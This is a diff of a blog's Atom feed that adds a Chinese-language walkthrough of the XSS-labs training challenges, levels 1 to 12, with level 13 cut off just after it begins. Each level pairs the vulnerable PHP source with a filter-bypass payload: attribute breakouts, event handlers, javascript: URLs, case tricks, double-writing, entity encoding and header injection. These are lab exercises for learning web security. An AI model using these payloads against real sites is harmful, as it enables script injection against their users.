@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://kite-007.github.io</id>
     <title>Fr</title>
-    <updated>2021-03-15T00:56:05.998Z</updated>
+    <updated>2021-03-23T13:35:55.676Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://kite-007.github.io"/>
     <link rel="self" href="https://kite-007.github.io/atom.xml"/>
@@ -10,6 +10,1165 @@
     <logo>https://kite-007.github.io/images/avatar.png</logo>
     <icon>https://kite-007.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Fr</rights>
+    <entry>
+        <title type="html"><![CDATA[# XSS-labs]]></title>
+        <id>https://kite-007.github.io/xss-ba-chang/</id>
+        <link href="https://kite-007.github.io/xss-ba-chang/">
+        </link>
+        <updated>2021-03-22T08:05:28.000Z</updated>
+        <content type="html"><![CDATA[<p><ul class="markdownIt-TOC">
+<li><a href="#1-xss-level1">1. xss-level1</a></li>
+<li><a href="#2-xss-level2">2. xss-level2</a></li>
+<li><a href="#3-xss-level3">3. xss-level3</a></li>
+<li><a href="#4-xss-level4">4. xss-level4</a></li>
+<li><a href="#5-xss-level5">5. xss-level5</a></li>
+<li><a href="#6-xss-level6">6. xss-level6</a></li>
+<li><a href="#7-xss-level7">7. xss-level7</a></li>
+<li><a href="#8-xss-level8">8. xss-level8</a></li>
+<li><a href="#9-xss-level9">9. xss-level9</a></li>
+<li><a href="#10-xss-level10">10. xss-level10</a></li>
+<li><a href="#11-xss-level11">11. xss-level11</a></li>
+<li><a href="#12-xss-level12">12. xss-level12</a></li>
+<li><a href="#13-xss-level13">13. xss-level13</a></li>
+<li><a href="#14-xss-level14">14. xss-level14</a></li>
+<li><a href="#15-xss-level15">15. xss-level15</a></li>
+<li><a href="#16-xss-level16">16. xss-level16</a></li>
+<li><a href="#17-xss-level17">17. xss-level17</a></li>
+<li><a href="#18-xss-level18">18. xss-level18</a></li>
+<li><a href="#19-xss-level19">19. xss-level19</a></li>
+<li><a href="#20-xss-level20">20. xss-level20</a></li>
+</ul>
+(XSS)</p>
+<h1 id="1-xss-level1">1. xss-level1</h1>
+<ol>
+<li>查看文件源码；</li>
+</ol>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level2.php?keyword=test&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level1&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level1&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;name&quot;];
+echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;
+?&gt;
+&lt;center&gt;&lt;img src=level1.png&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>首先，在head标签的script中重写了alert方法，它会在弹出提示的同时跳转到下一关。</li>
+<li>之后查看到它是以GET方式提交用户名，并没有对这个字符串进行过滤，所以存在xss注入。</li>
+</ul>
+<ol>
+<li>在HackBar中，显示URL:XSS/level1.php?name=test里更改test，直接执行alert方法，完成。</li>
+</ol>
+<pre><code>level1.php?name=&lt;script&gt;alert()&lt;/script&gt;
+</code></pre>
+<h1 id="2-xss-level2">2. xss-level2</h1>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level3.php?writing=wait&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level2&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level2&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level2.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str.'&quot;&gt;
+&lt;input type=submit name=submit value=&quot;搜索&quot;/&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;center&gt;&lt;img src=level2.png&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>一样执行跳转，但是这里有.htmlspecialchars($str).对字符串进行了预定义字符转化为实体
+<ul>
+<li>htmlspecialchars() 函数把一些预定义的字符转换为 HTML 实体，默认不会处理单引号。</li>
+<li>预定义的字符是：</li>
+</ul>
+</li>
+</ul>
+<pre><code>&amp; （和号）成为 &amp;amp;
+&quot; （双引号）成为 &amp;quot;
+' （单引号）成为 '
+&lt; （小于）成为 &amp;lt;
+&gt; （大于）成为 &amp;gt;
+</code></pre>
+<ul>
+<li>如需把特殊的 HTML 实体转换回字符，请使用 htmlspecialchars_decode() 函数。<br>
+我们看到在input标签中有我们提交的value的值，并没有进行过滤就进行输出，所以把input标签闭合，从而执行alert。</li>
+</ul>
+<pre><code>level2.php?keyword=&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;
+</code></pre>
+<h1 id="3-xss-level3">3. xss-level3</h1>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level4.php?keyword=try harder!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level3&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level3&lt;/h1&gt;
+&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.&quot;&lt;center&gt;
+&lt;form action=level3.php method=GET&gt;
+&lt;input name=keyword  value='&quot;.htmlspecialchars($str).&quot;'&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&quot;;
+?&gt;
+&lt;center&gt;&lt;img src=level3.png&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>我们看到这里他对value进行了预定义字符转实体的过滤，实际上单引号还是可以闭合（因为默认没有对单引号进行处理），所以用单引号对input里的value进行包裹使其为空字符串，并利用“事件”：onclick或ondblclick等的其他 <a href="https://www.w3school.com.cn/tags/html_ref_eventattributes.asp">HTML事件</a>。</li>
+</ul>
+<pre><code>&lt;input name=keyword  value='' onclick='alert()'&gt;
+level3.php?keyword=' onclick='alert()
+</code></pre>
+<h1 id="4-xss-level4">4. xss-level4</h1>
+<ol>
+<li>ctrl+u查看源码：</li>
+</ol>
+<pre><code>&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;
+&lt;head&gt;
+&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt;
+&lt;script&gt;
+window.alert = function()  
+{     
+confirm(&quot;完成的不错！&quot;);
+ window.location.href=&quot;level5.php?keyword=find a way out!&quot;; 
+}
+&lt;/script&gt;
+&lt;title&gt;欢迎来到level4&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level4&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;quot; ondblclick=&amp;quot;alert()相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&quot; ondblclick=&quot;alert()&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level4.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:21&lt;/h3&gt;&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<ul>
+<li>根据前面的经验，这里的预定义字符又被过滤了，上一关的是使用单引号进行闭合，这里本应该使用双引号进行包裹，但是会发现这里双引号是会被转义的，那么怎么办？</li>
+<li>但是仔细看就会发现，这里h2标签中的双引号被转义了，input标签中并没有，所以用双引号包裹，完成。</li>
+</ul>
+<ol start="2">
+<li>php代码:</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level4.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>可以看出input标签中str3只是替换掉了尖括号，h2中则进行了预定义字符转义。</li>
+</ul>
+<h1 id="5-xss-level5">5. xss-level5</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level5&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;lt;script&amp;gt;alert()&amp;lt;/script&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&lt;scr_ipt&gt;alert()&lt;/script&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+</code></pre>
+<ul>
+<li>在h2标签中会进行预定义字符转义，value中一些特殊字符中会加上下划线</li>
+<li>过滤掉了script和事件。</li>
+</ul>
+<ol start="2">
+<li>payload,点击something超链接执行js</li>
+</ol>
+<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
+level5.php?keyword=&quot; /&gt; &lt;a href=javascript:alert()&gt;something&lt;/a&gt;
+</code></pre>
+<p>javascript:是表示在触发默认动作时，执行一段JavaScript代码，而 javascript:; 表示什么都不执行，这样点击时就没有任何反应。<br>
+href：URL    规定链接的目标 URL。</p>
+<pre><code>&lt;a href=&quot;www.baidu.com&quot;&gt;XXX&lt;/a&gt;   这个a标签的话就是指点击XXX后跳转到百度首页
+&lt;a href=&quot;javascript:;&quot;&gt;XXX&lt;/a&gt;  点击XXX后是不会跳转的，一般用于开发时页面还未完成
+</code></pre>
+<ol start="3">
+<li>php代码</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level5.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str3.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>strtolower就是将字母转换为小写并返回值</li>
+</ul>
+<ol start="4">
+<li><a href="https://www.html.cn/qa/javascript/11155.html">javascript伪协议</a>：
+<ul>
+<li>伪协议是为关联应用程序而使用的，JavaScript伪协议实际上是把javascript:后面的代码当JavaScript来执行，并将结果值返回给当前页面。</li>
+<li>这个特殊的协议类型声明了URL的主体是任意的javascript代码，它由javascript的解释器运行。如果javascript:URL中的javascript代码含有多个语句，必须使用分号将这些语句分隔开。</li>
+<li>当浏览器装载了这样的URL时，它将执行这个URL中包含的javascript代码，并把最后一条javascript语句的字符串值作为新文档的内容显示出来。这个字符串值可以含有HTML标记，并被格式化，其显示与其他装载进浏览器的文档完全相同。</li>
+<li>javascript URL还可以含有只执行动作，但不返回值的javascript语句。装载了这种URL时，浏览器仅执行其中的javascript代码，但由于没有作为新文档来显示的值，因此它并不改变当前显示的文档。</li>
+</ul>
+</li>
+</ol>
+<h1 id="6-xss-level6">6. xss-level6</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level6&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和 &amp;quot; /&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;something&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot; &quot; /&gt; &lt;a hr_ef=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+</code></pre>
+<ul>
+<li>在前面的基础上过滤了href</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str2=str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level6.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>发现了与上一关不同的是这里并没有对大小写进行过滤</li>
+</ul>
+<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a HREF=javascript:alert()&gt;something&lt;/a&gt;&quot;&gt;
+level6.php?keyword=&quot; /&gt; &lt;a HREF=javascript:alert()&gt;something&lt;/a&gt;
+</code></pre>
+<h1 id="7-xss-level7">7. xss-level7</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level7&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和&amp;quot; /&amp;gt; &amp;lt;a href=javascript:alert()&amp;gt;something&amp;lt;/a&amp;gt;相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;a =java:alert()&gt;something&lt;/a&gt;&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+</code></pre>
+<ul>
+<li>过滤了大小写，特殊字符直接删除掉了</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str =strtolower( $_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;&quot;,$str5);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form action=level7.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.$str6.'&quot;&gt;
+&lt;input type=submit name=submit value=搜索 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>发现对数据进行了一次删除的过滤，所以可以进行双写包裹绕过。</li>
+</ul>
+<pre><code>&lt;input name=keyword  value=&quot;&quot; /&gt; &lt;script&gt;alert()&lt;/script&gt;&quot;&gt;
+&quot;/&gt; &lt;scripscriptt&gt;alert()&lt;/scriscriptpt&gt;
+</code></pre>
+<h1 id="8-xss-level8">8. xss-level8</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level8&lt;/h1&gt;
+&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;on&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;o_n&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:3&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>过滤大小写，特殊字符增加下划线，上面对预字符进行过滤，下面没有过滤尖括号。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = strtolower($_GET[&quot;keyword&quot;]);
+$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);
+$str3=str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);
+$str4=str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);
+$str5=str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);
+$str6=str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);
+$str7=str_replace('&quot;','&amp;quot',$str6);
+echo '&lt;center&gt;
+&lt;form action=level8.php method=GET&gt;
+&lt;input name=keyword  value=&quot;'.htmlspecialchars($str).'&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+&lt;?php
+ echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+?&gt;
+&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+&lt;?php 
+echo &quot;&lt;h3 align=center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;/h3&gt;&quot;;
+?&gt;
+</code></pre>
+<ol start="3">
+<li>实体化编码，在搜索框中输入</li>
+</ol>
+<pre><code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#116;:alert()&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level8.jpg&gt;&lt;/center&gt;
+javascrip&amp;#116;:alert()
+</code></pre>
+<ul>
+<li>因为这里的过滤都是在后端进行，而在后端被实体化编码的部分可以绕过过滤，返回前端时又可以被浏览器解析为原来的样子。</li>
+</ul>
+<h1 id="9-xss-level9">9. xss-level9</h1>
+<ol>
+<li>ctrl+u,提示要有一个合法链接</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level9&lt;/h1&gt;
+&lt;center&gt;
+&lt;form action=level9.php method=GET&gt;
+&lt;input name=keyword  value=&quot;javascrip&amp;amp;#116;:alert()&quot;&gt;
+&lt;input type=submit name=submit value=添加友情链接 /&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:23&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php
+if(false===strpos($str7,'http://'))
+{
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+        }
+else
+{
+  echo '&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;'.$str7.'&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;';
+}
+?&gt;
+</code></pre>
+<ul>
+<li>这里与level8的区别，加了一个if判断语句，查询链接中是否有http://，如果没有则连接不合法。</li>
+<li>strpos：查询（http://）第一次出现的位置，布尔类型。</li>
+</ul>
+<ol start="3">
+<li>在http://前加了//表示对后面的进行了注释，从而不影响前面的代码。</li>
+</ol>
+<ul>
+<li>这里可以想出http://可以在字符串的任意位置，只要不影响恶意的代码，所以可以写再alert里面尝试。</li>
+</ul>
+<pre><code>&lt;/center&gt;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;javascrip&amp;#116;:alert()//http://&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&lt;center&gt;&lt;img src=level9.png&gt;&lt;/center&gt;
+javascrip&amp;#116;:alert()//http://
+javascrip&amp;#116;:alert('http://')
+</code></pre>
+<h1 id="10-xss-level10">10. xss-level10</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level10&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level10.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>第一个参数keyword的预定义字符被过滤掉了，查看代码后发现还有三个隐藏掉的input，先试一试用GET方式提交参数，发现只有t_sort有显示信息，并且被过滤掉了尖括号。</li>
+<li>从t_sort入手，带有尖括号的标签不能用了，所以尝试使用事件，通过闭合value构造payload。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str11 = $_GET[&quot;t_sort&quot;];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ol start="3">
+<li>payload</li>
+</ol>
+<pre><code>level10.php?t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()
+</code></pre>
+<h1 id="11-xss-level11">11. xss-level11</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level11&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&amp;lt;'&amp;quot;c&amp;quot;'&amp;gt;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level11.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>t_sort信息有回显，但是预定义字符被过滤掉了。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_REFERER'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ref&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<ul>
+<li>发现这里t_ref是有xss漏洞的，但是提交的方式并不是GET而是SERVER，可以通过HackBar进行Referer提交payload</li>
+</ul>
+<ol start="3">
+<li></li>
+</ol>
+<pre><code>http://192.168.200.1/WWW/XSS/level11.php?t_link=a&amp;t_history=b&amp;t_sort=&lt;&quot;c&quot;&gt;&amp;t_ref=d
+Referer：&quot; type=&quot;text&quot; onclick=&quot;alert()
+</code></pre>
+<h1 id="12-xss-level12">12. xss-level12</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level12&lt;/h1&gt;
+&lt;h2 align=center&gt;没有找到和相关的结果.&lt;/h2&gt;&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;&amp;lt;&amp;quot;c&amp;quot;&amp;gt;&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;&lt;center&gt;&lt;img src=level12.png&gt;&lt;/center&gt;
+&lt;h3 align=center&gt;payload的长度:0&lt;/h3&gt;&lt;/body&gt;
+</code></pre>
+<ul>
+<li>有个参数t_ua的后面是我们的User Agent信息，所以直接试一试上一关的payload，通过HackBar的User Agent提交。</li>
+</ul>
+<ol start="2">
+<li>php</li>
+</ol>
+<pre><code>&lt;?php 
+ini_set(&quot;display_errors&quot;, 0);
+$str = $_GET[&quot;keyword&quot;];
+$str00 = $_GET[&quot;t_sort&quot;];
+$str11=$_SERVER['HTTP_USER_AGENT'];
+$str22=str_replace(&quot;&gt;&quot;,&quot;&quot;,$str11);
+$str33=str_replace(&quot;&lt;&quot;,&quot;&quot;,$str22);
+echo &quot;&lt;h2 align=center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;/h2&gt;&quot;.'&lt;center&gt;
+&lt;form id=search&gt;
+&lt;input name=&quot;t_link&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_history&quot;  value=&quot;'.'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_sort&quot;  value=&quot;'.htmlspecialchars($str00).'&quot; type=&quot;hidden&quot;&gt;
+&lt;input name=&quot;t_ua&quot;  value=&quot;'.$str33.'&quot; type=&quot;hidden&quot;&gt;
+&lt;/form&gt;
+&lt;/center&gt;';
+?&gt;
+</code></pre>
+<h1 id="13-xss-level13">13. xss-level13</h1>
+<ol>
+<li>ctrl+u</li>
+</ol>
+<pre><code>&lt;body&gt;
+&lt;h1 align=center&gt;欢迎来到level13&lt;/h1&gt;
